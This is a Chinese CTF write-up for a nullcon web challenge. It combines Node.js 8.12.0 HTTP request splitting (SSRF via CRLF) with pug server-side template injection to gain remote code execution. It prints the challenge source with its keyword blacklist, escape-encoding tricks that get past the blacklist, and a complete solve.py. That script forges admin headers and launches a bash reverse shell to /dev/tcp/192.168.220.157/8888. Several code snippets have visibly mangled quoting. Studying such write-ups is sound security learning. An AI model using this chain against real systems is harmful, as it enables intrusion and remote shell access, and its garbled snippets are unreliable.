@@ -1,0 +1,285 @@
+### 原创L's合天智汇  
+
+### 前言  
+
+nodejs 8.12.0版本的请求拆分攻击(感觉现在叫http走私要好一点2333)，pug模板的注入导致rce
+
+### 0x01 首页  
+
+当我们访问<http://web2.ctf.nullcon.net:8081/>后会显示下面的页面。![v2-f7a8fe33dfc1217f7f5b5d4fb36f84c4_720w](https://pic3.zhimg.com/80/v2-f7a8fe33dfc1217f7f5b5d4fb36f84c4_720w.png)由于上面没有什么特点，url参数，交互框等，因此我们查看源代码看看有没有什么提示。![v2-93c84ce1a6616e51f107c766943b6201_720w](https://pic2.zhimg.com/80/v2-93c84ce1a6616e51f107c766943b6201_720w.png)通过源码(F12查看的)我们可以看到它在页面加载js代码完成后发送了个ajax请求：
+
+    
+    
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+           document.getElementById("search").innerHTML = xhttp.responseText;
+        }
+    };
+    xhttp.open("GET", "/core?q=1", true);
+    xhttp.send();
+
+我使用get请求发送/core?q=1，但是结果跟上面的首页是一样的只有一个动图，这时你可能会想会不会是sql注入，服务器端注入等，但是经过一系列的反恐尝试之没有什么用。但是在我们查看源代码的时候还给了个提示<!--/source -->通过访问/source可以获取题目源码。
+
+    
+    
+    //node 8.12.0
+    var express = require('express');
+    var app = express();
+    var fs = require('fs');
+    var path = require('path');
+    var http = require('http');
+    var pug = require('pug');
+    app.get('/', function(req, res) {
+        res.sendFile(path.join(dirname + '/index.html'));
+    });
+    app.get('/source', function(req, res) {
+        res.sendFile(path.join(dirname + '/source.html'));
+    });
+    app.get('/getMeme',function(req,res){
+        res.send('via GIPHY')
+    });
+    app.get('/flag', function(req, res) {
+        var ip = req.connection.remoteAddress;
+        if (ip.includes('127.0.0.1')) {
+            var authheader = req.headers['adminauth'];
+            var pug2 = decodeURI(req.headers['pug']);
+            var x=pug2.match(/[a-z]/g);
+            if(!x){
+                if (authheader === "secretpassword") {
+                    var html = pug.render(pug2);
+                }
+            }
+            else{
+                res.send("No characters");
+            }
+        }
+        else{
+            res.send("You need to come from localhost");
+        }
+    });
+    app.get('/core', function(req, res) {
+        var q = req.query.q;
+        var resp = "";
+        if (q) {
+            var url = 'http://localhost:8081/getMeme?' + q
+            console.log(url)
+            var trigger = blacklist(url);
+            if (trigger === true) {
+                res.send("Errrrr, You have been Blocked");
+            } else {
+                try {
+                    http.get(url, function(resp) {
+                        resp.setEncoding('utf8');
+                        ...省略...
+                    });
+                } catch (error) {
+                    console.log(error);
+                }
+            }
+        } else {
+            res.send("search param 'q' missing!");
+        }
+    })
+    function blacklist(url) {
+        var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
+        var arrayLen = evilwords.length;
+        for (var i = 0; i < arrayLen; i++) {
+            const trigger = url.includes(evilwords[i]);
+            if (trigger === true) {
+                return true
+            }
+        }
+    }
+    ...省略...
+
+### 0x02 代码分析  
+
+通过阅读上面的代码，我们可以看到node的版本是8.12.0，服务器端使用的框架是express，使用nodejs自带的http包发送某些请求，服务端使用pug作为渲染模板(原理加jade)。在没有发现漏洞之前，先梳理一下代码的流程：1./:使用sendFile来读取index.html页面并且渲染该页面，通过前面我们知道该页面有提示的内容。2./source:该页面返回了服务器端的全部代码。3./getMeme:该页面没有什么用就是返回了一个iframe框架，其中是个动图。4./flag:这里验证远程地址包含127.0.0.1，adminauth===secretpassword，headers头中必须包含pug字段并且其值不能包含小写字母，最后会用pug引擎渲染pug，但是这里在渲染容易受到服务器端注入攻击<https://zhuanlan.zhihu.com/p/28823933>，由此我们可以断定前面需要用SSRF结合CRLF来绕过，不由联想到node的版本号，因为该版本存在[request
+splitting漏洞](https://hackerone.com/reports/409943)。复制链接做实验啦Flask服务端模板注入漏洞：[实验:Flask服务端模板注入漏洞(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID87ed-2223-40e5-8083-f5c55d69af28)![v2-edd9f10fa0c6d7c1f843b1d6f3345d74_720w](https://pic3.zhimg.com/80/v2-edd9f10fa0c6d7c1f843b1d6f3345d74_720w.png)
+
+### pug模板注入示例：  
+
+    
+    
+    const pug=require('pug');
+    pug.render('#{console.log("1")}');
+    pug.render('-console.log(1)');
+
+结果如下：
+
+    
+    
+    1
+    1
+    1
+
+对于pug模板的相关知识可以参考如下链接：<https://pugjs.org/language/interpolation.html>通过动态的调试我们可以看到代码的拼接过程：
+
+    
+    
+    var runtime = require('./');
+    module.exports = wrap;
+    // 利用js的Function来定义一个函数，pug是参数，后面是函数的定义
+    function wrap(template, templateName) {
+      templateName = templateName || 'template';
+      return Function('pug',
+        template + '\n' +
+        'return ' + templateName + ';'
+      )(runtime);
+    }
+
+到:
+
+    
+    
+    (function anonymous(pug
+    ) {
+    function template(locals) {var pug_html = "", pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;var locals_for_with = (locals || {});(function (console) {;pug_debug_line = 1;
+    pug_html = pug_html + "\u003C" + (console.log("1")) + "\u003E\u003C\u002F" + (console.log("1")) + "\u003E";}.call(this,"console" in locals_for_with?locals_for_with.console:typeof console!=="undefined"?console:undefined));} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}
+    return template;
+    })
+
+上面的这段代码中的template函数就是通过Function来构造的，代码拼接进去的部分就是\u003C后面的console.log("1")和\u003E前面的console.log("1")，拼接了两个console.log("1")这就是，然后在函数运行的时候就会执行console.log("1")。我们可以看到代码拼接进去了，结合上面两段代码简化一下就是：
+
+    
+    
+    const t=Function('pug','function template(locals) {(console.log(locals))}'+'\n' +
+        'return ' + 'template' + ';');
+    t()("1");
+
+request splitting漏洞代码示例：
+
+    
+    
+    const http = require('http')
+    const server = http.createServer((req, res) => {
+      console.log(req.url);
+      res.end();
+    });
+    server.listen(8000, function() {
+      http.get('http://192.168.220.157:8000/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private', function() {
+      });
+    });
+
+结果如下：
+
+    
+    
+    listening on [any] 8000 ...
+    192.168.220.1: inverse host lookup failed: Unknown host
+    connect to [192.168.220.157] from (UNKNOWN) [192.168.220.1] 65115
+    GET /?param=x HTTP/1.1
+    Host:%7B %7D127.0.0.1:8000
+    GET /private HTTP/1.1
+    Host: 192.168.220.157:8000
+    Connection: close
+
+由上面的结果可知我们已经成功实现了CRLF注入(上面的显示:为%7B
+%7D可能是我kali的问题)。接下来我们需要看那里调用了http.get导致SSRF。5./core这里的q是我们可控的，而且这里使用了http.get来发起请求刚好满足我们上面的条件，但是构造的url中不能有["global",
+"process","mainModule","require","root","child_process","exec","\"","'","!"]字符串，我们可以对代码进行[jsfuck](http://www.jsfuck.com/)加密绕过，但是由于加密后的代码太大，请求量会很大，因此一般用js的匿名函数来绕过，且字母我们可以用8进制，16进制来代替，例如：
+
+    
+    
+    []['map']'constructor'')();
+    []['\155\141\160']'\143\157\156\163\164\162\165\143\164\157\162'')();
+    []['\x6d\x61\x70']'\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72'')();
+
+构造的脚本如下：
+
+    
+    
+    function stringToHex(str,mode=8){
+        const splitChar=["\"","\'","`","[","]",";","(",")",".","1","2","3","4","5","6","7","8","9"];
+        let result = "";
+        for(let i = 0; i < str.length; i++){
+            if(result === ""){
+                const char=str[i];
+                if(splitChar.includes(char)){
+                    result=char
+                }else {
+                    result=str.charCodeAt(i).toString(mode)
+                }
+            }else{
+                const char=str[i];
+                if(splitChar.includes(char)){
+                    result+=char
+                }else {
+                    const tmp=str.charCodeAt(i).toString(mode);
+                    mode===8?
+                        result += "\" + tmp:
+                        result += "\x" + tmp;
+                }
+            }
+        }
+        return result;
+    }
+    console.log(stringToHex("[]['map']'constructor'')();",16));
+
+上面的原理相当于构造了个new Function("alert(1)")();，由于Object的constructor是指向Function的，示例如下：
+
+    
+    
+    //我们可以使用以下方式创建一个函数:
+    new Function("alert(1)");
+    //也可以不要new
+    Function("alert(1)")()
+    //可以将Function转换下
+    "...".substr.constructor("alert(1)")()
+    //再转换下
+    "..."["substr"]"constructor"")()
+    //字符串全部转义
+    "..."["\163\165\142\163\164\162"]"\143\157\156\163\164\162\165\143\164\157\162"();
+
+代码我们也梳理了一遍，现在我们来看看怎么rce拿到flag。
+
+### 0x03 利用过程：  
+
+solve.py
+
+    
+    
+    # coding=UTF-8
+    import requests
+    from requests.utils import quote
+    def strTohex(str):
+        result=""
+        for i in str:
+            if i>='a'and i<='z':
+                result+='\'+oct(ord(i))[1:]
+            else:
+                result+=i
+        return result
+    https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/
+    SPACE=u'\u0120'.encode('utf-8')
+    CRLF=u'\u010d\u010a'.encode('utf-8')
+    SLASH=u'\u012f'.encode('utf-8')
+    cmd = 'bash -i >& /dev/tcp/192.168.220.157/8888 0>&1'
+    payload = "process.binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','%s'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})" % (cmd)
+    pug = strTohex('''-[]["constructor"]"constructor"()'''.format(payload)).replace('"','%22').replace("'","%27")
+    pug = strTohex('''#{[]["constructor"]"constructor"()}'''%(payload)).replace('"','%22').replace("'","%27")
+    print quote(pug)
+    payload='sol'+SPACE+'HTTP'+SLASH+'1.1'+CRLF*2+'GET'+SPACE+SLASH+'flag'+SPACE+'HTTP'+SLASH+'1.1'+CRLF+'x-forwarded-for:'+SPACE+'127.0.0.1'+CRLF+'adminauth:'+SPACE+'secretpassword'+CRLF+'pug:'+SPACE+pug+CRLF+'test:'+SPACE
+    print payload
+    res=requests.get('http://192.168.220.154:8081/core?q='+quote(payload))
+    
+
+#res=requests.get('http://web2.ctf.nullcon.net:8081/core?q='+requote_uri(payload))
+print res.content
+
+结果如下：![v2-a6597a451fea2f59437821de27ce7814_720w](https://pic2.zhimg.com/80/v2-a6597a451fea2f59437821de27ce7814_720w.png)
+
+### 0x04 总结  
+
+通过这次的学习，感觉自己还有好多的不足，因此自己还有好多需要去了解的，去学习的。参考链接[https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.htm](https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html)[l](https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html)
+
+<https://mengsec.com/2019/06/14/alert1-to-win/>
+
+<https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/>
+
+<https://zhuanlan.zhihu.com/p/28823933>
+
+<https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html>
+
+声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！  
+
